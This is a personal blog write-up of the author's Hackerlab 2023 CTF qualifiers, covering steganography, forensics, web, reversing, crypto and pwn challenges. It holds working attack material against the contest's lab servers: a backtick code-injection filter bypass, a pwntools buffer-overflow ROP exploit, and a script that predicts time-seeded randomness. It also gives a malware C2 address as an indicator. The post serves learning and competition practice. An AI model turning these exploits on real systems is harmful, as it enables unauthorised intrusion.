---
title: "Hackerlab 2023"
date: 2023-09-03T13:33:31+01:00
draft: false
categories:
  - Hackerlab
---

Once again I was part of the [hackerlab my country hosts yearly](https://qualif.hackerlab.bj)
This year the competition was more intense than ever and my team `zer0ne` got placed 23rd on scoreboard and we made it to the finals (top 20 teams) on 18th position and I still don't understand how XD

Unfortunately I am currently very busy so I could not participate in the final

{{< post-img src="zero.png" alt="hackerlab-2023" style="width:200px" >}}

Here is a quick recapitulative writeup


## Basics

# Ghezo (unsolved: 50pts)

This one traumatized me XD
It was a steg/crypto chall worth 50 points...The minimum points and I could not solve that
We got a 20 megabyte "png" picture. Yup you heard that right...20 mega-fricking-bytes
Original file not provided because...damn THAT'S BIG! Instead here is a converted version

{{< post-img src="ghezo.png" alt="ghezo" style="width:200px" >}}

could not be more suspicious so obviously we ran `file ghezo.png` to see it's actually a `netbpm pixmap` file
the magic numbers are `P3` and the extension should be `.ppm`. This format is uncompressed and the funny thing is that
P3 allow ascii encoding to represent pixel values. A-MA-ZING!

I tried alot of things but could not manage this very unfamiliar file format so here is a script written by
[those awesome people](https://github.com/parfaittolefo/hackerlab2023/)

```python
import re
import numpy as np
from PIL import Image
from pathlib import Path

contents = Path('king.ppm').read_text()
Pidentifier, h, w,  *pixels = re.findall(r'[0-9]+', contents)
h = int(h)
w = int(w)

na = np.array(pixels[w*h*-3:], dtype=np.uint8).reshape((w,h,3))
Image.fromarray(na).save("result.png")

```
Basically this converts the ppm to a real png fixing the conspicuously modified image height
which reveals colored pixels...

{{< post-img src="cut.bmp" alt="hexahue" style="width:200px" >}}

The thing I needed to know at this very moment to solve this is `Hexahue alphabet`
Damn this!

# SPY (solved: 60pts)

Ok this one was easy! Forensics (sorry for file not provided :p)
Basically open the provided `mage.pdf` and download `The_magician.pdf` attachment
pro tip: It's not a pdf
Do some basic analysis (struggle first) then use `virustotal` for easier hindsights
`url from memory patterns: tcp://172.28.13.26:7243`
Highly suspicious if you ask me

# Asen hotagantin (unsolved: 70pts)

{{< post-img src="hotagantin.png" alt="hotagantin" style="width:200px" >}}

You see this png? guess what...this is no png
This is an `APNG` yes "A" stands for animated and this is cleverly delayed so it's hard to notice
In the `exif metadata` you can see it's made using [EZGIF](https://ezgif.com) so just go there or use `apngdis`
Anyway you get two frames and one is a `stereogram`...that's what I missed...the frickin' stereogram part
Just use `stegsolve`

# PHP GOAT (solved: 100pts)

This one too was not hard! Web challenge!
Basically code injection with blacklisting bypass. Code is even provided

{{< post-img src="php.png" alt="php" style="width:200px" >}}

Just used my good old backtick (`ls`)

{{< post-img src="gj.png" alt="gj" style="width:200px" >}}

# Tic tac toe (solved: 80pts)

Next is a bit tricky for web challenge but not hard. Experience is what helped me here:

- Notice the .map file in minified js
- Use `sourcemapper` (github) or anything else to "unmap" and get a clear js
- notice in `App.vue` the commented out encrypt function
- decode the AES...Here, like this...

```js
const CryptoJS = require('crypto-js');
const k = '6cfad18816be65f2';
const output = "U2FsdGVkX1/sPQHn8qbrD9LyPIipROeMnqke4B+JJEq8sVgV0zeA+ab2oHP92avnl2vzHVBs0/0NeOLbGmoj9g==";

const decryptedBytes = CryptoJS.AES.decrypt(output, k);
const decryptedMessage = decryptedBytes.toString(CryptoJS.enc.Utf8);

console.log("Decrypted Message:", decryptedMessage);

```

- Get a weird text and use [the kitchen](https://gchq.github.io/CyberChef)
here is the sauce: XOR with key = 5 (its...magic bro)


# Danxome (solved: 100pts)

This one was my favorite! (sorry again I deleted the binary file)
Reverse chall and once again it was experience that saved me
Elf64 making us wait for eternity using `sleep`...Been there done that
Example of custom sleep library forged and called `nosleeplib.so`

```c
/* nosleep.c */
#include <time.h>
#include <unistd.h>

unsigned int sleep(unsigned int seconds)
{
return 0;
}
int usleep(useconds_t usec)
{
return 0;
}
int nanosleep(const struct timespec *req, struct timespec *rem)
{
return 0;
}
```
patch it with `LD_PRELOAD` and wait a reasonable amount of time for the flag

# U.T.C (unsolved 100pts)

Ok this one was quite cool but I could not solve this simplistic challenge
Here look at the [server code](utc.py)

Yeah you noticed the use of `t = int(time.time())` and `random.seed(t)` too?
I tried to bruteforce that...quite stupid you say? maybe! Actually the seeding makes it not-random-anymore
Yup...basically...

```python
import random
from pwn import *

#Connexion au serveur
r = remote('54.37.70.250', 1873)
recept=r.recv()
recept=recept.decode()
print(recept)
print('envoi de du choix "e" ...')
r.sendline('e'.encode())

# Récupération du time
t = int(time.time())

#Récupération du message chiffré
recept=r.recv()
recept=recept.decode()
recept=recept[:-1]
recept=recept.split('-')
random.seed(t)
print(recept)

# Process de déchiffrement
decrypted_treasure = []
for c in recept:
    rd = random.randint(0, 255)
    b = (int(c) - int(rd)) % 256
    decrypted_treasure.append(b)
print(decrypted_treasure)
original_treasure = bytes(decrypted_treasure).decode()
print(original_treasure)
```

As I did not solve it I will simply provide a [link to my favorite solution](https://raw.githubusercontent.com/parfaittolefo/Hackerlab2023/main/Basic/Challenge%20file/utc_solves.py)


# Le fâ (solved: 100pts)

Pwn challenge I could not pwn [chall](/hackerlab2023/fa/chall)

```py
from pwn import *

context.binary = "chall"
s = remote("54.37.70.250", 2002)
s.sendafter(b": ",
  b"a"*0x28 +
  p64(0x400b03) + # pop rdi
  p64(0x6010c0) + # username
  #p64(0x6010e0) + # password
  p64(0x4006a0)[:-1])  # puts
s.shutdown("send")
print(s.recvall())

```

I won't even try to explain just go [here](https://github.com/parfaittolefo/Hackerlab2023/blob/main/Basic/Hackerlab_2023_qualif-PWN-Le-F%C3%A2.md)

# Puzzle (solved: 120pts)

This one was weird and fun but could not solve it too. Here are the pieces

- [part 1](puzzle/part1.fbx)
- [part 2](puzzle/part2.jpeg)

For part 2 I used cyberchef magic to retrieve this awesome cool photo of king behanzin

{{< post-img src="puzzle/behanzin.jpeg" alt="Hackerlab" style="width:200px" >}}

Annnd then I got stuck...well I could not find a solution writeup yet so I will update this when available



# Qualification Stages

This year they **"gently suggested"** everyone who solved the qualifs should write a writeup
(mostly to filter cheating I guess)
So I will simply provide links to those pdf (mine for those I solved and my favorite solutions for others)

- [Heviosso nou gué (solved: 250pts)](heviosso-nou-gue.pdf)

- [Agoodjie (solved: 300pts)](agoodjie.pdf)

Totally out of context but here is a beautiful image of AGOODJIE that was displayed on the challenge website

{{< post-img src="amazone.jpeg" alt="amazones" style="width:400px" >}}

You needed to see it

- [soft.reading(unsolved: 350pts)](https://github.com/parfaittolefo/Hackerlab2023/blob/9dd3bbf370f94b0e6c87b52eb79ec3a627577d13/Writeups_Stages/WriteUp%20_Soft.reading_.pdf)

- [Tchètoula (unsolved: 400pts)](https://github.com/parfaittolefo/Hackerlab2023/blob/9dd3bbf370f94b0e6c87b52eb79ec3a627577d13/Writeups_Stages/Writeup_Tchetoula_N4t10n.pdf)

- [Gankpa Mè (unsolved: 450pts)](https://github.com/Tednoob17/HackerLab2023/blob/45cda5b82a769069e2d19fb37c29d2056240b6fc/Qualifications%20Stages/HackerLab2023%20-%20Gankpa%20M%C9%9B.pdf)


## END OF THE LINE!

{{< post-img src="rank.png" alt="my-scores" style="width: 300px;" >}}

I am very proud of my efforts this year as I could qualify for finals (kek)

I wish I had time to partake in finals...but I could not

That was an awesome experience and I had a lot of fun and still most importantly learnt alot!

Talented people still out there (shoutout to that monster guy [unblvr](https://twitter.com/Unblvr1) )

Still alot for me to learn, and that's once again what I am gonna do

keep learning folks!
